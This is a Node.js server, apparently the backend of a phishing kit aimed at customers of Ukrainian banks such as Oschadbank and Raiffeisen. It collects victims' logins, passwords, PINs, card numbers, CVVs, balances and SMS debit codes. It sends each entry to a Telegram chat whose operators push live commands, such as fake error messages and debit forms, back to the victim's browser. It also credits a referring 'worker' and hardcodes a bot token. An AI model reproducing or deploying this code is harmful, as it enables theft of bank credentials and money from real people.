const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const path = require('path');
const { atob } = require('buffer');

// --- КОНФИГУРАЦИЯ ---
const TELEGRAM_BOT_TOKEN = '8418105061:AAEoMN84vcQlrmb5Mqcd1KPbc7ZLdHNctCk';
const CHAT_ID = '-4840920969';
// --- КОНЕЦ КОНФИГУРАЦИИ ---

const RENDER_EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL;
const webhookPath = `/bot${TELEGRAM_BOT_TOKEN}`;
const WEBHOOK_URL = RENDER_EXTERNAL_URL ? (RENDER_EXTERNAL_URL + webhookPath) : null;

const app = express();
app.use(express.json());
app.use(cors());

app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
    next();
});
app.get('/', (req, res) => { res.sendFile(path.join(__dirname, 'index.html')); });

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

if (WEBHOOK_URL) {
    bot.setWebHook(WEBHOOK_URL)
        .then(() => console.log(`Webhook успешно установлен на ${WEBHOOK_URL}`))
        .catch(err => console.error('Ошибка установки вебхука:', err));
    bot.sendMessage(CHAT_ID, '✅ СЕРВЕР ПЕРЕЗАПУЩЕН! Изменения для банков применены.', { parse_mode: 'HTML' }).catch(console.error);
} else {
    console.error('Критическая ошибка: не удалось определить RENDER_EXTERNAL_URL. Вебхук не установлен.');
}

bot.getMe().then(me => console.log(`Бот запущен: @${me.username}`)).catch(err => console.error('Ошибка бота:', err));
app.post(webhookPath, (req, res) => { bot.processUpdate(req.body); res.sendStatus(200); });

const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });
const clients = new Map();
const sessions = new Map();

wss.on('connection', (ws) => {
    console.log('Клиент подключился по WebSocket');
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'register' && data.sessionId) {
                clients.set(data.sessionId, ws);
                console.log(`Клиент зарегистрирован: ${data.sessionId}`);
            }
        } catch (e) { console.error('Ошибка обработки WebSocket сообщения:', e); }
    });
    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(`Клиент отключился: ${sessionId}`);
            }
        });
    });
    ws.on('error', (error) => console.error('Ошибка WebSocket:', error));
});

bot.on('callback_query', (callbackQuery) => {
    const [type, sessionId] = callbackQuery.data.split(':');
    const ws = clients.get(sessionId);

    if (!ws || ws.readyState !== WebSocket.OPEN) {
        bot.answerCallbackQuery(callbackQuery.id, { text: '❗️Ошибка: клиент не в сети!', show_alert: true });
        return;
    }

    const sessionData = sessions.get(sessionId) || {};
    let command = { type: type, data: {} };
    let responseText = `Команда "${type}" отправлена!`;

    switch (type) {
        case 'telegram_debit':
            if (sessionData.bankName === 'Ощадбанк') command.type = 'telegram_debit';
            else command.type = 'show_debit_form';
            responseText = 'Запрос формы списания отправлен!';
            break;

        case 'request_details':
            command.type = 'show_request_details_form';
            responseText = 'Запрос деталей карты отправлен!';
            break;

        case 'password_error':
            if (sessionData.bankName === 'Райффайзен') {
                 command.type = 'raiff_pin_error';
            } else { // Ощад
                command.data = { loginType: sessionData.loginMethod || 'phone' };
            }
            responseText = 'Запрос "неверный пароль" отправлен!';
            break;

        case 'code_error':
            if (sessionData.bankName === 'Райффайзен') {
                command.type = 'raiff_code_error';
            } else if (sessionData.bankName !== 'Ощадбанк') {
                command.type = 'generic_debit_error';
            }
            responseText = 'Запрос "неверный код" отправлен!';
            break;

        // Команды, не требующие специальной логики
        case 'lk':
        case 'call':
        case 'ban':
        case 'other':
        case 'number_error':
        case 'balance_error':
            break;

        default:
            bot.answerCallbackQuery(callbackQuery.id, { text: `Неизвестная команда: ${type}` });
            return;
    }

    ws.send(JSON.stringify(command));
    bot.answerCallbackQuery(callbackQuery.id, { text: responseText });
});


app.post('/api/submit', (req, res) => {
    const { sessionId, isFinalStep, referrer, ...stepData } = req.body;
    let workerNick = 'unknown';
    try { if (referrer && referrer !== 'unknown') workerNick = atob(referrer); } catch (e) { /* ignore */ }

    const existingData = sessions.get(sessionId) || {};
    const newData = { ...existingData, ...stepData, workerNick };
    sessions.set(sessionId, newData);

    let message = '';
    let needsKeyboard = false;

    // --- Логика для Райффайзен Банка (последовательная отправка) ---
    if (newData.bankName === 'Райффайзен') {
        if (stepData.phone) {
            message = `<b>🏦 Вход в Райф (Шаг 1/3)</b>\n\n<b>Банк:</b> ${newData.bankName}\n<b>Номер:</b> <code>${stepData.phone}</code>\n<b>Worker:</b> @${workerNick}`;
            needsKeyboard = true;
        } else if (stepData.sms_code) {
            message = `<b>🏦 Вход в Райф (Шаг 2/3)</b>\n\n<b>SMS код:</b> <code>${stepData.sms_code}</code>\n<b>Сессия:</b> <code>${sessionId}</code>`;
        } else if (stepData.pin) {
            message = `<b>🏦 Вход в Райф (Шаг 3/3) ✅</b>\n\n<b>ПИН:</b> <code>${stepData.pin}</code>\n<b>Сессия:</b> <code>${sessionId}</code>`;
        }
    }
    // --- Логика для банков с запросом деталей (Альянс и др.) ---
    else if (stepData.card_cvv) { // Это лог с деталями карты (второй лог)
        message = `<b>💎 Детали карты (${newData.bankName})</b>\n\n`;
        message += `<b>Банк:</b> ${newData.bankName}\n`;
        message += `<b>Номер телефону:</b> <code>${newData.phone}</code>\n`;
        message += `<b>Номер карти:</b> <code>${newData.card}</code>\n`;
        message += `<b>Термін дії:</b> <code>${stepData.card_expiry}</code>\n`;
        message += `<b>CVV:</b> <code>${stepData.card_cvv}</code>\n`;
        message += `<b>Баланс:</b> <code>${stepData.card_balance}</code>\n`;
        message += `<b>Worker:</b> @${workerNick}\n`;
    }
    else if (stepData.card && newData.bankName !== 'Ощадбанк') { // Это ПЕРВЫЙ лог (телефон + карта)
        message = `<b>💳 Новый лог (${newData.bankName})</b>\n\n`;
        message += `<b>Банк:</b> ${newData.bankName}\n`;
        message += `<b>Номер телефону:</b> <code>${newData.phone}</code>\n`;
        message += `<b>Номер карти:</b> <code>${stepData.card}</code>\n`;
        message += `<b>Worker:</b> @${workerNick}\n`;
        needsKeyboard = true;
    }
    // --- Логика для кодов списания ---
    else if (stepData.debit_sms_code) {
        message = `<b>💸 Код списания (${newData.bankName})</b>\n\n`;
        message += `<b>Код:</b> <code>${stepData.debit_sms_code}</code>\n`;
        message += `<b>Сессия:</b> <code>${sessionId}</code>`;
    }
    // --- Логика для Ощадбанка ---
    else if (newData.bankName === 'Ощадбанк') {
        if (stepData.password && (stepData.login || stepData.phone)) {
            message = `<b>🏦 Вход в Ощад (${stepData.login ? 'Логин' : 'Телефон'})</b>\n\n`;
            if(stepData.login) message += `<b>Логин:</b> <code>${stepData.login}</code>\n`;
            if(stepData.phone) message += `<b>Номер:</b> <code>${stepData.phone}</code>\n`;
            message += `<b>Пароль:</b> <code>${stepData.password}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            needsKeyboard = true;
        } else if (stepData.fp_pin) {
            message = `<b>🔧 Восстановление (Ощад)</b>\n\n`;
            message += `<b>Мобильный:</b> <code>${newData.fp_phone}</code>\n`;
            message += `<b>Номер карты:</b> <code>${newData.fp_card}</code>\n`;
            message += `<b>Пин:</b> <code>${stepData.fp_pin}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            needsKeyboard = true;
        } else if (stepData.call_code) {
             message = `<b>📞 Код со звонка (Ощад):</b> <code>${stepData.call_code}</code>\n<i>Сессия: ${sessionId}</i>`;
        } else if (stepData.sms_code) {
             message = `<b>💸 Код списания (Ощад):</b> <code>${stepData.sms_code}</code>\n<i>Сессия: ${sessionId}</i>`;
        }
    }

    if (message) {
        const keyboard = needsKeyboard ? generateKeyboard(sessionId, newData.bankName) : undefined;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML', reply_markup: keyboard })
           .catch(err => console.error("Telegram send error:", err));
    }

    res.status(200).json({ message: 'OK' });
});

function generateKeyboard(sessionId, bankName) {
    let keyboard = [];
    const baseRow1 = [ { text: '❌Номер', callback_data: `number_error:${sessionId}` }, { text: '❌Баланс', callback_data: `balance_error:${sessionId}` }, { text: 'Бан', callback_data: `ban:${sessionId}` } ];
    const baseRow2 = [ { text: 'Другой', callback_data: `other:${sessionId}` } ];

    if (bankName === 'Ощадбанк') {
        keyboard = [
            [{ text: 'Звонок', callback_data: `call:${sessionId}` }, { text: 'Списание', callback_data: `telegram_debit:${sessionId}` }],
            [{ text: '❌Пароль', callback_data: `password_error:${sessionId}` }, { text: '❌Код', callback_data: `code_error:${sessionId}` }],
            baseRow1, baseRow2
        ];
    } else if (bankName === 'Райффайзен') {
         keyboard = [
            [{ text: 'Списание', callback_data: `telegram_debit:${sessionId}` }],
            [{ text: '❌Пароль', callback_data: `password_error:${sessionId}` }, { text: '❌Код', callback_data: `code_error:${sessionId}` }],
            baseRow1, baseRow2
        ];
    } else { // Клавиатура для Альянс, Восток и т.д.
        keyboard = [
            [{ text: 'Списание', callback_data: `telegram_debit:${sessionId}` }, { text: 'Запрос', callback_data: `request_details:${sessionId}` }],
            [{ text: '❌Код', callback_data: `code_error:${sessionId}` }],
            baseRow1, baseRow2
        ];
    }
    return { inline_keyboard: keyboard };
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log(`Сервер запущен на порту ${PORT}`));
